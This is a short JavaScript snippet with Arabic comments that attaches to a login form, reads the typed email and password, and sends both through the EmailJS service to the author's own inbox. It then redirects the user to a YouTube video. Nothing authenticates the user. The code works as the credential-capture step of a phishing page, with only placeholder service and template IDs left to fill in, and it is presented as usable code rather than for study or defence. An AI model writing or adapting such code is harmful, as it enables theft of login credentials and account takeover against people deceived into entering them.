document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    console.log("تم تقديم النموذج، البيانات: ", email, password); // تأكد من أن البيانات تم إرسالها

    // إرسال البيانات إلى بريدك باستخدام EmailJS
    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        email: email,
        password: password
    }).then(function(response) {
        console.log("تم إرسال البريد بنجاح: ", response);
        window.location.href = "https://www.youtube.com/watch?v=L8XbI9aJOXk"; // تأكد من أن التوجيه يحدث هنا
    }, function(error) {
        console.error("فشل إرسال البريد: ", error);
        alert("حدث خطأ أثناء إرسال البيانات: " + error.text); // عرض تفاصيل الخطأ
    });
});
